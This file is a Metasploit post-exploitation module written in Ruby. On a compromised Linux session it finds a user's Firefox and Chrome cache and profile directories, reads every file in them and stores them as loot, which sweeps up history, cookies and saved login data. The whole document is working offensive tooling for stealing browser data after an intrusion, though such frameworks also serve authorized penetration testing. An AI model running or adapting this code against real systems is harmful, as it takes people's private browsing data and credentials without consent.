#
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Linux Gather Browser Artifacts',
        'Description'   => %q{This module gathers Browser (Firefox and Google Chrome)
         artifacts from the target},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Brendan Shupp', 'Stephen Brustowicz'],
        'Platform'      => [ 'linux' ],
        'SessionTypes'  => [ "meterpreter", "shell" ]
      ))
  end

  #
  # Save function
  #
  def save(msg, data, ctype = '')
    ltype = 'linux.post.history'
    loot = store_loot(ltype, ctype, session, data, nil, msg)
  end

  #
  # Cat File function
  #
  def cat_file(filename)
    output = read_file(filename)
    output
  end
  
  #
  # Collects data from Firefox
  #	
  def firefox_history(user, path)
    # Grabbing artifacts from .cache path
    ff_folders = dir(path)
    ff_folders.each do |ff_folders|
      if directory?("/home/#{user}/.cache/mozilla/firefox/#{ff_folders}/cache2")
        print_good("#{ff_folders}/cache2 exists")
        entries_folder = "/home/#{user}/.cache/mozilla/firefox/#{ff_folders}/cache2/entries"
        ff_artifacts = dir(entries_folder)
        ff_artifacts.each do |ff_artifacts|
          entry = cat_file("/home/#{user}/.cache/mozilla/firefox/#{ff_folders}/cache2/entries/#{ff_artifacts}")
          save("Firefox Entry", entry) unless entry.blank? || entry =~ /No entry/
        end
        # Grabbing artifacts from .mozilla path
	other_artifacts = "/home/#{user}/.mozilla/firefox/#{ff_folders}"
	ff_other_artifacts = dir(other_artifacts)
	ff_other_artifacts.each do |ff_other_artifacts|
	  if file?("/home/#{user}/.mozilla/firefox/#{ff_folders}/#{ff_other_artifacts}")
	   entry = cat_file("/home/#{user}/.mozilla/firefox/#{ff_folders}/#{ff_other_artifacts}")
	   save("Firefox Entry", entry) unless entry.blank? || entry =~ /No entry/
	  end
	end
	print_good("Firefox artifacts downloaded")
      else
        print_bad("#{ff_folders}/cache2 doesn't exist")
      end
    end
    print_status("")
  end
  
  #
  # Collects data from Google Chrome
  #
  def chrome_history(user, path)
     # Grabbing artifacts from .cache path
     gc_artifacts = dir(path)
     print_status("Downloading Chrome artifacts...")
     gc_artifacts.each do |gc_artifacts|
       if file?("/home/#{user}/.cache/google-chrome/Default/Cache/#{gc_artifacts}")
	 entry = cat_file("/home/#{user}/.cache/google-chrome/Default/Cache/#{gc_artifacts}")
	 save("Chrome Entry", entry) unless entry.blank? || entry =~ /No entry/
       end
     end
     # Grabbing artifacts from .config path
     gc_other_artifacts = dir("/home/#{user}/.config/google-chrome/Default")
     gc_other_artifacts.each do |gc_other_artifacts|
       if file?("/home/#{user}/.config/google-chrome/Default/#{gc_other_artifacts}")
         entry = cat_file("/home/#{user}/.config/google-chrome/Default/#{gc_other_artifacts}")
         save("Chrome Entry", entry) unless entry.blank? || entry =~ /No extry/
       end
     end
     print_good("Chrome artifacts downloaded")
  end

  #
  # Executes the Module
  #
  def run
    print_status("Finding possible Firefox and Chrome install...")
    
    # Grabs current user
    if datastore['USER']
      user = datastore['USER']
    else
      user = cmd_exec('whoami').chomp
    end
    # Path Locations if Firefox and/or Google Chrome is present
    firefox_path = "/home/#{user}/.cache/mozilla/firefox"
    chrome_path = "/home/#{user}/.cache/google-chrome/Default/Cache"
    if directory?(firefox_path)
      print_good("Firefox is installed for #{user}")
      firefox_history(user, firefox_path)
    else
      print_bad("Firefox is not installed")
    end
    if directory?(chrome_path)
      print_good("Chrome is installed for #{user}")
      chrome_history(user, chrome_path)
    else
      print_bad("Chrome is not installed")
    end
  end
end
